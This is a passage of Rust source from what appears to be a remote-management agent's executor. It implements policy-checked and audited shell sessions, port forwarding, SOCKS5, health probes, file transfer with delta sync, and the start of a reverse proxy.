            size: TerminalSize { rows, cols },
            cwd: None,
            env: env.into_iter().collect(),
            timeout_secs: 3600,
            record: true,
        };

        match PtySession::spawn(config) {
            Ok(session) => {
                let session_id = uuid::Uuid::new_v4().to_string();
                // Create session recorder for replay-grade traceability
                let now_ms = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_millis() as u64;
                let recorder = SessionRecorder::new(cols, rows, now_ms);
                let mut shells = self.shells.lock().await;
                shells.insert(session_id.clone(), (session, recorder));
                self.audit(
                    request_id,
                    "shell_open",
                    Some(shell_bin.clone()),
                    "allowed",
                    matched_rule,
                    Some(0),
                    start.elapsed().as_millis() as u64,
                    None,
                );
                RpcResult::ShellOpened { session_id }
            }
            Err(e) => RpcResult::Error {
                message: format!("PTY spawn failed: {e}"),
            },
        }
    }

    #[cfg(unix)]
    async fn handle_shell_input(
        &self,
        request_id: &str,
        session_id: &str,
        data: &[u8],
        start: Instant,
    ) -> RpcResult {
        self.audit(
            request_id,
            "shell_input",
            Some(session_id.to_string()),
            "allowed",
            "shell-session".into(),
            None,
            start.elapsed().as_millis() as u64,
            None,
        );

        let now_ms = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_millis() as u64;

        let mut shells = self.shells.lock().await;
        match shells.get_mut(session_id) {
            Some((session, recorder)) => {
                // Record input event
                let input_str = String::from_utf8_lossy(data);
                recorder.record_input(&input_str, now_ms);

                match session.write(data) {
                    Ok(_) => {
                        // Read back any available output
                        let mut buf = vec![0u8; 8192];
                        // Small delay to let the shell process the input
                        drop(shells);
                        tokio::time::sleep(Duration::from_millis(10)).await;
                        let mut shells = self.shells.lock().await;
                        if let Some((session, recorder)) = shells.get_mut(session_id) {
                            let read_time_ms = std::time::SystemTime::now()
                                .duration_since(std::time::UNIX_EPOCH)
                                .unwrap_or_default()
                                .as_millis() as u64;
                            match session.read(&mut buf) {
                                Ok(0) => RpcResult::ShellOutput {
                                    session_id: session_id.to_string(),
                                    data: Vec::new(),
                                },
                                Ok(n) => {
                                    // Record output event
                                    let output_str = String::from_utf8_lossy(&buf[..n]);
                                    recorder.record_output(&output_str, read_time_ms);
                                    RpcResult::ShellOutput {
                                        session_id: session_id.to_string(),
                                        data: buf[..n].to_vec(),
                                    }
                                }
                                Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                                    RpcResult::ShellOutput {
                                        session_id: session_id.to_string(),
                                        data: Vec::new(),
                                    }
                                }
                                Err(e) => RpcResult::Error {
                                    message: format!("PTY read error: {e}"),
                                },
                            }
                        } else {
                            RpcResult::Error {
                                message: "session disappeared".into(),
                            }
                        }
                    }
                    Err(e) => RpcResult::Error {
                        message: format!("PTY write error: {e}"),
                    },
                }
            }
            None => RpcResult::Error {
                message: format!("shell session not found: {session_id}"),
            },
        }
    }

    #[cfg(unix)]
    async fn handle_shell_resize(&self, session_id: &str, rows: u16, cols: u16) -> RpcResult {
        use crate::pty::TerminalSize;
        let shells = self.shells.lock().await;
        match shells.get(session_id) {
            Some((session, _recorder)) => {
                session.resize(TerminalSize { rows, cols });
                RpcResult::Success {
                    stdout: String::new(),
                    stderr: String::new(),
                    exit_code: 0,
                    duration_ms: 0,
                }
            }
            None => RpcResult::Error {
                message: format!("shell session not found: {session_id}"),
            },
        }
    }

    #[cfg(unix)]
    async fn handle_shell_close(
        &self,
        request_id: &str,
        session_id: &str,
        start: Instant,
    ) -> RpcResult {
        use crate::pty::PtySignal;
        let mut shells = self.shells.lock().await;
        match shells.remove(session_id) {
            Some((session, recorder)) => {
                let _ = session.signal(PtySignal::Sighup);

                // Emit session recording as an audit entry for replay-grade traceability
                let event_count = recorder.event_count();
                if event_count > 0 {
                    let asciicast = recorder.to_asciicast();
                    let _ = self.audit.log(AuditEntry {
                        timestamp: Utc::now(),
                        request_id: request_id.to_string(),
                        action: "shell_recording".into(),
                        command: Some(session_id.to_string()),
                        decision: "recorded".into(),
                        matched_rule: format!("{event_count} events"),
                        exit_code: None,
                        duration_ms: start.elapsed().as_millis() as u64,
                        caller_key: self.caller_key.clone(),
                        reason: Some(asciicast),
                        prev_hash: None,
                        hmac: None,
                    });
                }

                self.audit(
                    request_id,
                    "shell_close",
                    Some(session_id.to_string()),
                    "allowed",
                    "shell-session".into(),
                    Some(0),
                    start.elapsed().as_millis() as u64,
                    None,
                );
                RpcResult::ShellExited {
                    session_id: session_id.to_string(),
                    exit_code: 0,
                }
            }
            None => RpcResult::Error {
                message: format!("shell session not found: {session_id}"),
            },
        }
    }

    // --- Port forward handlers ---

    async fn handle_port_forward(
        &self,
        request_id: &str,
        bind_addr: &str,
        target_addr: &str,
        start: Instant,
    ) -> RpcResult {
        use rf_rpc::forward::start_local_forward;

        // Policy check — port forwarding is equivalent to a network command
        let cmd_repr = format!("port-forward {bind_addr} {target_addr}");
        let policy = self.policy.read().await;
        let decision = policy.check_command(&cmd_repr);
        if !decision.allowed {
            self.audit(
                request_id,
                "port_forward",
                Some(cmd_repr),
                "denied",
                decision.matched_rule.clone(),
                None,
                start.elapsed().as_millis() as u64,
                None,
            );
            self.record_policy_decision(false);
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        self.record_policy_decision(true);
        let matched_rule = decision.matched_rule.clone();
        drop(policy);

        let (cancel_tx, cancel_rx) = tokio::sync::watch::channel(false);
        match start_local_forward(bind_addr, target_addr.to_string(), cancel_rx).await {
            Ok(handle) => {
                let forward_id = uuid::Uuid::new_v4().to_string();
                let bound = bind_addr.to_string();
                let mut forwards = self.forwards.lock().await;
                forwards.insert(
                    forward_id.clone(),
                    ActiveForward {
                        _handle: handle,
                        cancel: cancel_tx,
                        bind_addr: bound.clone(),
                    },
                );
                self.audit(
                    request_id,
                    "port_forward",
                    Some(cmd_repr),
                    "allowed",
                    matched_rule,
                    Some(0),
                    start.elapsed().as_millis() as u64,
                    None,
                );
                RpcResult::ForwardStarted {
                    forward_id,
                    bind_addr: bound,
                }
            }
            Err(e) => RpcResult::Error {
                message: format!("port forward bind failed: {e}"),
            },
        }
    }

    async fn handle_port_forward_close(
        &self,
        request_id: &str,
        forward_id: &str,
        start: Instant,
    ) -> RpcResult {
        let mut forwards = self.forwards.lock().await;
        match forwards.remove(forward_id) {
            Some(fwd) => {
                let _ = fwd.cancel.send(true);
                self.audit(
                    request_id,
                    "forward_close",
                    Some(forward_id.to_string()),
                    "allowed",
                    "forward-session".into(),
                    Some(0),
                    start.elapsed().as_millis() as u64,
                    None,
                );
                RpcResult::ForwardStopped {
                    forward_id: forward_id.to_string(),
                }
            }
            None => RpcResult::Error {
                message: format!("forward not found: {forward_id}"),
            },
        }
    }

    async fn handle_remote_forward(
        &self,
        request_id: &str,
        bind_addr: &str,
        target_addr: &str,
        start: Instant,
    ) -> RpcResult {
        use rf_rpc::forward::start_remote_forward;

        // Policy check
        let cmd_repr = format!("remote-forward {bind_addr} {target_addr}");
        let policy = self.policy.read().await;
        let decision = policy.check_command(&cmd_repr);
        if !decision.allowed {
            self.audit(
                request_id,
                "remote_forward",
                Some(cmd_repr),
                "denied",
                decision.matched_rule.clone(),
                None,
                start.elapsed().as_millis() as u64,
                None,
            );
            self.record_policy_decision(false);
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        self.record_policy_decision(true);
        let matched_rule = decision.matched_rule.clone();
        drop(policy);

        let (cancel_tx, cancel_rx) = tokio::sync::watch::channel(false);
        match start_remote_forward(bind_addr, target_addr.to_string(), cancel_rx).await {
            Ok((handle, bound)) => {
                let forward_id = uuid::Uuid::new_v4().to_string();
                let bound_str = bound.to_string();
                let mut forwards = self.forwards.lock().await;
                forwards.insert(
                    forward_id.clone(),
                    ActiveForward {
                        _handle: handle,
                        cancel: cancel_tx,
                        bind_addr: bound_str.clone(),
                    },
                );
                self.audit(
                    request_id,
                    "remote_forward",
                    Some(cmd_repr),
                    "allowed",
                    matched_rule,
                    Some(0),
                    start.elapsed().as_millis() as u64,
                    None,
                );
                RpcResult::ForwardStarted {
                    forward_id,
                    bind_addr: bound_str,
                }
            }
            Err(e) => RpcResult::Error {
                message: format!("remote forward bind failed: {e}"),
            },
        }
    }

    async fn handle_socks5_forward(
        &self,
        request_id: &str,
        bind_addr: &str,
        start: Instant,
    ) -> RpcResult {
        use rf_rpc::socks5::{Socks5Config, Socks5Server};

        // Policy check
        let cmd_repr = format!("socks5-forward {bind_addr}");
        let policy = self.policy.read().await;
        let decision = policy.check_command(&cmd_repr);
        if !decision.allowed {
            self.audit(
                request_id,
                "socks5_forward",
                Some(cmd_repr),
                "denied",
                decision.matched_rule.clone(),
                None,
                start.elapsed().as_millis() as u64,
                None,
            );
            self.record_policy_decision(false);
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        self.record_policy_decision(true);
        let matched_rule = decision.matched_rule.clone();
        drop(policy);

        let (cancel_tx, cancel_rx) = tokio::sync::watch::channel(false);
        let config = Socks5Config {
            bind_addr: bind_addr.to_string(),
            ..Default::default()
        };
        let mut server = Socks5Server::new(config, cancel_rx);
        match server.run().await {
            Ok(bound) => {
                let forward_id = uuid::Uuid::new_v4().to_string();
                let bound_str = bound.to_string();
                let mut forwards = self.forwards.lock().await;
                // Use a no-op JoinHandle placeholder since Socks5Server spawns internally
                let handle = tokio::spawn(async {});
                forwards.insert(
                    forward_id.clone(),
                    ActiveForward {
                        _handle: handle,
                        cancel: cancel_tx,
                        bind_addr: bound_str.clone(),
                    },
                );
                self.audit(
                    request_id,
                    "socks5_forward",
                    Some(cmd_repr),
                    "allowed",
                    matched_rule,
                    Some(0),
                    start.elapsed().as_millis() as u64,
                    None,
                );
                RpcResult::ForwardStarted {
                    forward_id,
                    bind_addr: bound_str,
                }
            }
            Err(e) => RpcResult::Error {
                message: format!("SOCKS5 forward failed: {e}"),
            },
        }
    }

    // --- Health check handler ---

    async fn handle_health_check(
        &self,
        request_id: &str,
        probe_type: &str,
        target: &str,
        timeout_ms: u64,
        start: Instant,
    ) -> RpcResult {
        use crate::health::{ProbeType, execute_probe};

        // Policy check — command probes need command policy check
        if probe_type == "command" {
            let policy = self.policy.read().await;
            let decision = policy.check_command(target);
            if !decision.allowed {
                self.audit(
                    request_id,
                    "health_check",
                    Some(format!("{probe_type}:{target}")),
                    "denied",
                    decision.matched_rule.clone(),
                    None,
                    start.elapsed().as_millis() as u64,
                    None,
                );
                self.record_policy_decision(false);
                return RpcResult::Denied {
                    reason: decision.reason,
                    rule: decision.matched_rule,
                };
            }
            self.record_policy_decision(true);
            drop(policy);
        }

        let probe = match probe_type {
            "tcp" => {
                // Parse target as host:port
                let parts: Vec<&str> = target.rsplitn(2, ':').collect();
                if parts.len() != 2 {
                    return RpcResult::Error {
                        message: "invalid target format, expected host:port".into(),
                    };
                }
                let port: u16 = match parts[0].parse() {
                    Ok(p) => p,
                    Err(_) => {
                        return RpcResult::Error {
                            message: "invalid port".into(),
                        };
                    }
                };
                ProbeType::Tcp {
                    host: parts[1].to_string(),
                    port,
                }
            }
            "http" => ProbeType::Http {
                url: target.to_string(),
                expected_status: 200,
            },
            "command" => ProbeType::Command {
                cmd: target.to_string(),
            },
            "process" => ProbeType::Process {
                name: target.to_string(),
            },
            _ => {
                return RpcResult::Error {
                    message: format!("unknown probe type: {probe_type}"),
                };
            }
        };

        let timeout_dur = Duration::from_millis(timeout_ms);
        let result = execute_probe(&probe, timeout_dur).await;

        self.audit(
            request_id,
            "health_check",
            Some(format!("{probe_type}:{target}")),
            "allowed",
            "default-allow".into(),
            if result.success { Some(0) } else { Some(1) },
            start.elapsed().as_millis() as u64,
            None,
        );

        RpcResult::HealthCheckResult {
            success: result.success,
            latency_ms: result.latency_ms,
            error: result.error,
        }
    }

    // --- Log tail handler ---

    async fn handle_tail_log(
        &self,
        request_id: &str,
        path: &str,
        lines: Option<u32>,
        start: Instant,
    ) -> RpcResult {
        // Policy check — reading a log file requires path policy check
        let file_path = std::path::Path::new(path);
        let policy = self.policy.read().await;
        let decision = policy.check_path(file_path);
        if !decision.allowed {
            self.audit(
                request_id,
                "tail_log",
                Some(path.to_string()),
                "denied",
                decision.matched_rule.clone(),
                None,
                start.elapsed().as_millis() as u64,
                None,
            );
            self.record_policy_decision(false);
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        self.record_policy_decision(true);
        let matched_rule = decision.matched_rule.clone();
        drop(policy);

        // Read the last N lines from a file
        let max_lines = lines.unwrap_or(50) as usize;

        match tokio::fs::read_to_string(path).await {
            Ok(content) => {
                let all_lines: Vec<&str> = content.lines().collect();
                let start_line = all_lines.len().saturating_sub(max_lines);
                let tail: Vec<String> = all_lines[start_line..]
                    .iter()
                    .map(|s| s.to_string())
                    .collect();
                self.audit(
                    request_id,
                    "tail_log",
                    Some(path.to_string()),
                    "allowed",
                    matched_rule,
                    Some(0),
                    start.elapsed().as_millis() as u64,
                    None,
                );
                RpcResult::TailOutput {
                    lines: tail,
                    path: path.to_string(),
                }
            }
            Err(e) => RpcResult::Error {
                message: format!("failed to read {path}: {e}"),
            },
        }
    }

    #[allow(clippy::too_many_arguments)]
    async fn handle_file_push(
        &self,
        request_id: &str,
        path: &str,
        offset: u64,
        data: &[u8],
        done: bool,
        checksum: &Option<String>,
        mode: Option<u32>,
        compress: bool,
        start: Instant,
    ) -> RpcResult {
        let file_path = std::path::Path::new(path);

        // Policy check
        let policy = self.policy.read().await;
        let decision = policy.check_path(file_path);
        if !decision.allowed {
            self.audit(
                request_id,
                "file_push",
                Some(path.to_string()),
                "denied",
                decision.matched_rule.clone(),
                None,
                start.elapsed().as_millis() as u64,
                None,
            );
            self.record_policy_decision(false);
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        self.record_policy_decision(true);
        let matched_rule = decision.matched_rule.clone();
        drop(policy);

        // Decompress if requested — agent receives zstd-compressed chunk, decompresses before write
        let decompressed_buf;
        let data: &[u8] = if compress {
            decompressed_buf = match zstd::decode_all(data) {
                Ok(d) => d,
                Err(e) => {
                    return RpcResult::Error {
                        message: format!("zstd decompress: {e}"),
                    };
                }
            };
            &decompressed_buf
        } else {
            data
        };

        // Enforce file size limit: offset + this chunk must not exceed max_file_size_bytes
        {
            let policy = self.policy.read().await;
            let chunk_end = offset + data.len() as u64;
            if chunk_end > policy.max_file_size_bytes {
                return RpcResult::Denied {
                    reason: format!(
                        "file size limit exceeded: {} > {} bytes",
                        chunk_end, policy.max_file_size_bytes
                    ),
                    rule: "resources.maxFileSizeBytes".to_string(),
                };
            }
        }

        // Write chunk to temp file
        let temp_path = format!("{path}.rf_transfer");

        // For first chunk (offset=0), create/truncate the file
        use tokio::io::AsyncWriteExt;
        let result = if offset == 0 {
            tokio::fs::write(&temp_path, data).await
        } else {
            // Append at offset
            let mut file = match tokio::fs::OpenOptions::new()
                .write(true)
                .create(true)
                .truncate(false)
                .open(&temp_path)
                .await
            {
                Ok(f) => f,
                Err(e) => {
                    return RpcResult::Error {
                        message: format!("open temp file: {e}"),
                    };
                }
            };
            use tokio::io::AsyncSeekExt;
            if let Err(e) = file.seek(std::io::SeekFrom::Start(offset)).await {
                return RpcResult::Error {
                    message: format!("seek: {e}"),
                };
            }
            file.write_all(data).await
        };

        if let Err(e) = result {
            return RpcResult::Error {
                message: format!("write chunk: {e}"),
            };
        }

        // Bandwidth throttle: pace chunk delivery to stay within the configured transfer rate
        {
            let throttle = self.policy.read().await.max_transfer_bytes_per_sec;
            if throttle > 0 && !data.is_empty() {
                let expected_us = (data.len() as u64 * 1_000_000) / throttle;
                let elapsed_us = start.elapsed().as_micros() as u64;
                if expected_us > elapsed_us {
                    tokio::time::sleep(Duration::from_micros(expected_us - elapsed_us)).await;
                }
            }
        }

        let new_offset = offset + data.len() as u64;

        // If done, verify checksum and atomically rename
        if done {
            // Verify checksum if provided
            if let Some(expected) = checksum {
                use sha2::{Digest, Sha256};
                let file_data = match tokio::fs::read(&temp_path).await {
                    Ok(d) => d,
                    Err(e) => {
                        let _ = tokio::fs::remove_file(&temp_path).await;
                        return RpcResult::Error {
                            message: format!("read for checksum: {e}"),
                        };
                    }
                };
                let digest = Sha256::digest(&file_data);
                let hash: String = digest.iter().map(|b| format!("{b:02x}")).collect();
                if hash != *expected {
                    let _ = tokio::fs::remove_file(&temp_path).await;
                    return RpcResult::Error {
                        message: format!("checksum mismatch: expected {expected}, got {hash}"),
                    };
                }
            }

            // Atomic rename
            if let Err(e) = tokio::fs::rename(&temp_path, path).await {
                let _ = tokio::fs::remove_file(&temp_path).await;
                return RpcResult::Error {
                    message: format!("finalize rename: {e}"),
                };
            }

            // Set file permissions if specified
            #[cfg(unix)]
            if let Some(m) = mode {
                use std::os::unix::fs::PermissionsExt;
                let perms = std::fs::Permissions::from_mode(m);
                let _ = tokio::fs::set_permissions(path, perms).await;
            }

            self.audit(
                request_id,
                "file_push",
                Some(path.to_string()),
                "allowed",
                matched_rule,
                Some(0),
                start.elapsed().as_millis() as u64,
                None,
            );

            RpcResult::FileChunkAck {
                offset: new_offset,
                finalized: true,
            }
        } else {
            RpcResult::FileChunkAck {
                offset: new_offset,
                finalized: false,
            }
        }
    }

    async fn handle_file_pull(
        &self,
        request_id: &str,
        path: &str,
        offset: u64,
        max_chunk: u32,
        compress: bool,
        start: Instant,
    ) -> RpcResult {
        let file_path = std::path::Path::new(path);

        // Policy check
        let policy = self.policy.read().await;
        let decision = policy.check_path(file_path);
        if !decision.allowed {
            self.audit(
                request_id,
                "file_pull",
                Some(path.to_string()),
                "denied",
                decision.matched_rule.clone(),
                None,
                start.elapsed().as_millis() as u64,
                None,
            );
            self.record_policy_decision(false);
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        self.record_policy_decision(true);
        let matched_rule = decision.matched_rule.clone();
        drop(policy);

        // Resolve symlinks
        let resolved = match tokio::fs::canonicalize(path).await {
            Ok(p) => p,
            Err(e) => {
                return RpcResult::Error {
                    message: format!("resolve path: {e}"),
                };
            }
        };

        // Get file size
        let metadata = match tokio::fs::metadata(&resolved).await {
            Ok(m) => m,
            Err(e) => {
                return RpcResult::Error {
                    message: format!("metadata: {e}"),
                };
            }
        };
        let total_size = metadata.len();

        // Enforce file size limit
        {
            let policy = self.policy.read().await;
            if total_size > policy.max_file_size_bytes {
                return RpcResult::Denied {
                    reason: format!(
                        "file size limit exceeded: {} > {} bytes",
                        total_size, policy.max_file_size_bytes
                    ),
                    rule: "resources.maxFileSizeBytes".to_string(),
                };
            }
        }

        // Read chunk at offset
        use tokio::io::{AsyncReadExt, AsyncSeekExt};
        let mut file = match tokio::fs::File::open(&resolved).await {
            Ok(f) => f,
            Err(e) => {
                return RpcResult::Error {
                    message: format!("open file: {e}"),
                };
            }
        };

        if offset > 0 {
            if let Err(e) = file.seek(std::io::SeekFrom::Start(offset)).await {
                return RpcResult::Error {
                    message: format!("seek: {e}"),
                };
            }
        }

        let chunk_size = max_chunk.min(256 * 1024) as usize; // Cap at 256KB
        let mut buf = vec![0u8; chunk_size];
        let bytes_read = match file.read(&mut buf).await {
            Ok(n) => n,
            Err(e) => {
                return RpcResult::Error {
                    message: format!("read chunk: {e}"),
                };
            }
        };
        buf.truncate(bytes_read);

        // Bandwidth throttle: pace chunk delivery to stay within the configured transfer rate
        {
            let throttle = self.policy.read().await.max_transfer_bytes_per_sec;
            if throttle > 0 && bytes_read > 0 {
                let expected_us = (bytes_read as u64 * 1_000_000) / throttle;
                let elapsed_us = start.elapsed().as_micros() as u64;
                if expected_us > elapsed_us {
                    tokio::time::sleep(Duration::from_micros(expected_us - elapsed_us)).await;
                }
            }
        }

        // Compress chunk if requested — client decompresses on receipt
        let (buf, compressed) = if compress && !buf.is_empty() {
            match zstd::encode_all(buf.as_slice(), 3) {
                Ok(c) => (c, true),
                Err(e) => {
                    tracing::warn!("zstd compress chunk failed: {e}");
                    (buf, false)
                }
            }
        } else {
            (buf, false)
        };

        // Compute checksum on last chunk
        let is_last = offset + bytes_read as u64 >= total_size;
        let checksum = if is_last {
            // Read entire file for checksum
            use sha2::{Digest, Sha256};
            match tokio::fs::read(&resolved).await {
                Ok(all_data) => {
                    let d = Sha256::digest(&all_data);
                    Some(d.iter().map(|b| format!("{b:02x}")).collect())
                }
                Err(_) => None,
            }
        } else {
            None
        };

        self.audit(
            request_id,
            "file_pull",
            Some(path.to_string()),
            "allowed",
            matched_rule,
            Some(0),
            start.elapsed().as_millis() as u64,
            None,
        );

        RpcResult::FileChunk {
            offset,
            data: buf,
            total_size,
            checksum,
            compressed,
        }
    }

    /// Compute Adler-32 checksum for a block of data.
    fn adler32(data: &[u8]) -> u32 {
        const MOD_ADLER: u32 = 65521;
        let mut a: u32 = 1;
        let mut b: u32 = 0;
        for &byte in data {
            a = (a + u32::from(byte)) % MOD_ADLER;
            b = (b + a) % MOD_ADLER;
        }
        (b << 16) | a
    }

    /// Query block-level checksums of a remote file for delta sync.
    async fn handle_file_delta_query(
        &self,
        request_id: &str,
        path: &str,
        block_size: u32,
        start: Instant,
    ) -> RpcResult {
        use rf_rpc::types::BlockInfo;
        let file_path = std::path::Path::new(path);

        // Policy check (read access)
        let policy = self.policy.read().await;
        let decision = policy.check_path(file_path);
        if !decision.allowed {
            self.audit(
                request_id,
                "file_delta_query",
                Some(path.to_string()),
                "denied",
                decision.matched_rule.clone(),
                None,
                start.elapsed().as_millis() as u64,
                None,
            );
            self.record_policy_decision(false);
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        self.record_policy_decision(true);
        let matched_rule = decision.matched_rule.clone();
        drop(policy);

        // If file does not exist, return missing indicator so caller falls back to full push
        let metadata = match tokio::fs::metadata(path).await {
            Ok(m) => m,
            Err(_) => {
                self.audit(
                    request_id,
                    "file_delta_query",
                    Some(path.to_string()),
                    "allowed",
                    matched_rule,
                    Some(0),
                    start.elapsed().as_millis() as u64,
                    None,
                );
                return RpcResult::FileDeltaIndex {
                    blocks: vec![],
                    total_size: 0,
                    file_missing: true,
                };
            }
        };

        let total_size = metadata.len();

        // Enforce file size limit
        {
            let policy = self.policy.read().await;
            if total_size > policy.max_file_size_bytes {
                return RpcResult::Denied {
                    reason: format!(
                        "file size limit exceeded: {} > {} bytes",
                        total_size, policy.max_file_size_bytes
                    ),
                    rule: "resources.maxFileSizeBytes".to_string(),
                };
            }
        }

        // Read entire file and compute per-block checksums
        let file_data = match tokio::fs::read(path).await {
            Ok(d) => d,
            Err(e) => {
                return RpcResult::Error {
                    message: format!("read file: {e}"),
                };
            }
        };

        let bs = block_size.max(1) as usize;
        let mut blocks: Vec<BlockInfo> = Vec::new();
        let mut offset = 0u64;
        for chunk in file_data.chunks(bs) {
            let adler32 = Self::adler32(chunk);
            use sha2::{Digest, Sha256};
            let digest = Sha256::digest(chunk);
            let sha256_hex: String = digest.iter().map(|b| format!("{b:02x}")).collect();
            blocks.push(BlockInfo {
                offset,
                size: chunk.len() as u32,
                adler32,
                sha256_hex,
            });
            offset += chunk.len() as u64;
        }

        self.audit(
            request_id,
            "file_delta_query",
            Some(path.to_string()),
            "allowed",
            matched_rule,
            Some(0),
            start.elapsed().as_millis() as u64,
            None,
        );

        RpcResult::FileDeltaIndex {
            blocks,
            total_size,
            file_missing: false,
        }
    }

    /// Apply a delta patch: reconstruct the file from unchanged remote blocks + new patch data.
    #[allow(clippy::too_many_arguments)]
    async fn handle_file_delta_patch(
        &self,
        request_id: &str,
        path: &str,
        block_size: u32,
        patches: &[rf_rpc::types::DeltaPatch],
        total_size: u64,
        checksum: &Option<String>,
        mode: Option<u32>,
        start: Instant,
    ) -> RpcResult {
        let file_path = std::path::Path::new(path);

        // Policy check (write access)
        let policy = self.policy.read().await;
        let decision = policy.check_path(file_path);
        if !decision.allowed {
            self.audit(
                request_id,
                "file_delta_patch",
                Some(path.to_string()),
                "denied",
                decision.matched_rule.clone(),
                None,
                start.elapsed().as_millis() as u64,
                None,
            );
            self.record_policy_decision(false);
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        self.record_policy_decision(true);
        let matched_rule = decision.matched_rule.clone();

        // Enforce file size limit
        if total_size > policy.max_file_size_bytes {
            return RpcResult::Denied {
                reason: format!(
                    "file size limit exceeded: {} > {} bytes",
                    total_size, policy.max_file_size_bytes
                ),
                rule: "resources.maxFileSizeBytes".to_string(),
            };
        }
        drop(policy);

        let bs = block_size.max(1) as usize;

        // Read existing file (may not exist if this is a new file)
        let existing: Vec<u8> = tokio::fs::read(path).await.unwrap_or_default();

        // Build patch lookup: offset → new data
        let patch_map: std::collections::HashMap<u64, &[u8]> = patches
            .iter()
            .map(|p| (p.offset, p.data.as_slice()))
            .collect();

        // Compute number of blocks needed for the new total_size
        let total_blocks = total_size.div_ceil(bs as u64) as usize;
        let mut new_file: Vec<u8> = Vec::with_capacity(total_size as usize);

        for block_idx in 0..total_blocks {
            let offset = (block_idx * bs) as u64;
            let remaining = total_size - offset;
            let this_block_size = remaining.min(bs as u64) as usize;

            if let Some(patch_data) = patch_map.get(&offset) {
                // Use patch data for this block
                let take = this_block_size.min(patch_data.len());
                new_file.extend_from_slice(&patch_data[..take]);
                if take < this_block_size {
                    new_file.extend(std::iter::repeat_n(0u8, this_block_size - take));
                }
            } else {
                // Copy unchanged block from existing file
                let src_start = offset as usize;
                let src_end = (src_start + this_block_size).min(existing.len());
                if src_start < existing.len() {
                    new_file.extend_from_slice(&existing[src_start..src_end]);
                    let copied = src_end - src_start;
                    if copied < this_block_size {
                        new_file.extend(std::iter::repeat_n(0u8, this_block_size - copied));
                    }
                } else {
                    new_file.extend(std::iter::repeat_n(0u8, this_block_size));
                }
            }
        }

        // Truncate to exact total_size
        new_file.truncate(total_size as usize);

        // Verify checksum if provided
        let checksum_verified = if let Some(expected) = checksum {
            use sha2::{Digest, Sha256};
            let digest = Sha256::digest(&new_file);
            let actual: String = digest.iter().map(|b| format!("{b:02x}")).collect();
            if actual != *expected {
                return RpcResult::Error {
                    message: format!("checksum mismatch: expected {expected}, got {actual}"),
                };
            }
            true
        } else {
            false
        };

        // Atomic write via temp file + rename
        let temp_path = format!("{path}.rf_delta");
        if let Err(e) = tokio::fs::write(&temp_path, &new_file).await {
            return RpcResult::Error {
                message: format!("write temp file: {e}"),
            };
        }
        if let Err(e) = tokio::fs::rename(&temp_path, path).await {
            let _ = tokio::fs::remove_file(&temp_path).await;
            return RpcResult::Error {
                message: format!("finalize rename: {e}"),
            };
        }

        // Set file permissions if specified
        #[cfg(unix)]
        if let Some(m) = mode {
            use std::os::unix::fs::PermissionsExt;
            let perms = std::fs::Permissions::from_mode(m);
            let _ = tokio::fs::set_permissions(path, perms).await;
        }

        let bytes_transferred: u64 = patches.iter().map(|p| p.data.len() as u64).sum();
        let blocks_changed = patches.len() as u32;

        self.audit(
            request_id,
            "file_delta_patch",
            Some(path.to_string()),
            "allowed",
            matched_rule,
            Some(0),
            start.elapsed().as_millis() as u64,
            None,
        );

        RpcResult::FileDeltaApplied {
            bytes_transferred,
            blocks_changed,
            total_blocks: total_blocks as u32,
            checksum_verified,
        }
    }

    /// Handle an `IngressRegister` action: the ingress server confirms registration.
    ///
    /// On the agent side this is a no-op that returns `IngressRegistered` — the real
    /// routing state is maintained inside the ingress server process, not the executor.
    /// This handler exists so the action flows through the normal policy/audit pipeline.
    async fn handle_ingress_register(
        &self,
        request_id: &str,
        agent_id: &str,
        upstream_url: &str,
        subdomain: Option<&str>,
        path_prefix: Option<&str>,
        start: Instant,
    ) -> RpcResult {
        self.audit(
            request_id,
            "ingress_register",
            Some(format!("agent={agent_id} upstream={upstream_url}")),
            "allowed",
            String::new(),
            Some(0),
            start.elapsed().as_millis() as u64,
            None,
        );
        let _ = subdomain;
        let _ = path_prefix;
        RpcResult::IngressRegistered {
            agent_id: agent_id.to_string(),
            upstream_url: upstream_url.to_string(),
        }
    }

    /// Forward an HTTP request from the ingress server to a local upstream service.
    ///
    /// Security: applies HTTP method+path policy before connecting.
    /// Enforces response-size and timeout limits.
    #[allow(clippy::too_many_arguments)]
    async fn handle_reverse_proxy(
        &self,
        request_id: &str,
        method: &str,
        path: &str,
        query: Option<&str>,
        headers: &[(String, String)],
        body: Option<&[u8]>,
        upstream_url: &str,
        timeout_ms: Option<u64>,
        max_response_bytes: Option<u64>,
        start: Instant,
    ) -> RpcResult {
        let policy = self.policy.read().await;

        // HTTP method + path policy check
        let http_decision = policy.check_http_request(method, path);
        if !http_decision.allowed {
            self.audit(
                request_id,
                "reverse_proxy",
                Some(format!("{method} {path}")),
                "denied",
                http_decision.matched_rule.clone(),
                None,
                start.elapsed().as_millis() as u64,
                None,
            );
            self.record_policy_decision(false);
            return RpcResult::Denied {
                reason: http_decision.reason,
                rule: http_decision.matched_rule,
            };
        }
        self.record_policy_decision(true);

        let effective_timeout_ms =
            timeout_ms.unwrap_or(policy.proxy_idle_timeout_seconds as u64 * 1000);
        let effective_max_bytes = max_response_bytes
            .unwrap_or(policy.max_output_bytes)
            .min(policy.max_output_bytes);
        drop(policy);

        // Build the full upstream URL with path and query
        let full_url = if let Some(q) = query {
            format!("{upstream_url}{path}?{q}")
        } else {
            format!("{upstream_url}{path}")
        };

        let upstream_start = Instant::now();

        // Build reqwest request
        let client = reqwest::Client::builder()
            .timeout(std::time::Duration::from_millis(effective_timeout_ms))
            .build()
            .unwrap_or_default();

        let method_val = match reqwest::Method::from_bytes(method.as_bytes()) {
            Ok(m) => m,
            Err(_) => {
                return RpcResult::Error {
                    message: format!("invalid HTTP method: {method}"),
                };
            }
        };

        let mut req_builder = client.request(method_val, &full_url);
